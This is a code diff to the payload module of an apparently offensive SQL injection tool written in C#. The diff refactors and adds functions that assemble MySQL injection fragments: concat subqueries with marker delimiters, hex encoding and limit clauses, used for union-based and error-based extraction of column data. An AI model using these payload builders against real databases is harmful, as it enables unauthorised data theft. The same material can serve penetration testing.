@@ -106,7 +106,7 @@ namespace SuperSQLInjection.payload
 
                 if (i == showIndex)
                 {
-                    sb.Append(creatMySQLColumnStr(columns) + ",");
+                    sb.Append(concatMySQLColumnStr(columns) + ",");
                 }
                 else
                 {
@@ -148,7 +148,7 @@ namespace SuperSQLInjection.payload
 
                 if (i == showIndex)
                 {
-                    sb.Append(creatMySQLColumnStr(data) + ",");
+                    sb.Append(concatMySQLColumn(data) + ",");
                 }
                 else
                 {
@@ -188,7 +188,7 @@ namespace SuperSQLInjection.payload
         public static String creatMySQLColumnsStrByError(List<String> columns, String table, String dbName, int limit)
         {
             StringBuilder sb = new StringBuilder();
-            sb.Append(creatMySQLColumnStr(columns));
+            sb.Append(concatMySQLColumnStr(columns));
 
             if (!Tools.checkEmpty(dbName))
             {
@@ -216,8 +216,14 @@ namespace SuperSQLInjection.payload
 
         public static String creatMySQLColumnsStrByError(String column, String table, String dbName, int limit)
         {
-            StringBuilder sb = new StringBuilder();
-            sb.Append(creatMySQLColumnStr(column));
+            List<String> List = new List<String>();
+            List.Add(column);
+            return creatMySQLColumnsStrByError(List, table, dbName, limit);
+        }
+        public static String creatMySQLColumnsHexStrByError(String column, String table, String dbName, int limit)
+        {
+            StringBuilder sb = new StringBuilder("(select ");
+            sb.Append(creatMySQLColumnHexStr(column));
 
             if (!Tools.checkEmpty(dbName))
             {
@@ -236,12 +242,49 @@ namespace SuperSQLInjection.payload
             }
             if (limit >= 0)
             {
-                sb.Append(" limit " + limit + ",1");
+                sb.Append(" limit " + limit + ",1)");
 
             }
             return sb.ToString();
         }
 
+        public static String creatMySQLColumnsNoConcatStr(List<String> columns, String table, String dbName, int limit)
+        {
+
+
+            StringBuilder sb = new StringBuilder("(select concat(");
+            foreach (String c in columns) {
+                    sb.Append(c + ",0x242424,");
+            }
+            if (columns.Count > 0)
+            {
+                sb.Remove(sb.Length - 10, 10);
+            }
+            sb.Append(")");
+            if (!Tools.checkEmpty(dbName))
+            {
+                sb.Append(" from " + dbName + ".");
+                if (!Tools.checkEmpty(table))
+                {
+                    sb.Append(table);
+                }
+            }
+            else
+            {
+                if (!Tools.checkEmpty(table))
+                {
+                    sb.Append(" from " + table);
+                }
+            }
+            if (limit >= 0)
+            {
+                sb.Append(" limit " + limit + ",1)");
+
+            }
+            return sb.ToString();
+        }
+
+        
 
 
         /// <summary>
@@ -249,18 +292,18 @@ namespace SuperSQLInjection.payload
         /// </summary>
         /// <param name="columns">列明</param>
         /// <returns></returns>
-        public static String creatMySQLColumnStr(List<String> columns)
+        public static String concatMySQLColumnStr(List<String> columns)
         {
             StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
             for (int i = 0; i < columns.Count; i++)
             {
                 if (columns.Count > 1)
                 {
-                    sb.Append("ifnull(cast(" + columns[i] + " as char),0x20),0x242424,");
+                    sb.Append(columns[i]+",0x242424,");
                 }
                 else
                 {
-                    return creatMySQLColumnStr(columns[i]);
+                    return concatMySQLColumn(columns[i]);
                 }
 
             }
@@ -275,12 +318,13 @@ namespace SuperSQLInjection.payload
         }
 
 
+
         /// <summary>
         /// 生成查询列数据
         /// </summary>
         /// <param name="columns">列明</param>
         /// <returns></returns>
-        public static String creatMySQLColumnStr(String column)
+        public static String concatMySQLColumn(String column)
         {
             StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
             sb.Append(column);
@@ -288,6 +332,37 @@ namespace SuperSQLInjection.payload
             return sb.ToString();
 
         }
+
+        /// <summary>
+        /// 生成查询列数据
+        /// </summary>
+        /// <param name="columns">列明</param>
+        /// <returns></returns>
+        public static String creatMySQLColumnCastStr(String column)
+        {
+            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
+            sb.Append("ifnull(cast(" + column + " as char),0x20)");
+            sb.Append(",0x215e5e)");
+            return sb.ToString();
+
+        }
+    
+        /// <summary>
+        /// 生成查询列数据
+        /// </summary>
+        /// <param name="columns">列明</param>
+        /// <returns></returns>
+        public static String creatMySQLColumnHexStr(String column)
+        {
+            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
+            sb.Append(hex_value.Replace("{data}",column));
+            sb.Append(",0x215e5e)");
+            return sb.ToString();
+
+        }
+
+
+
 
     }
 }
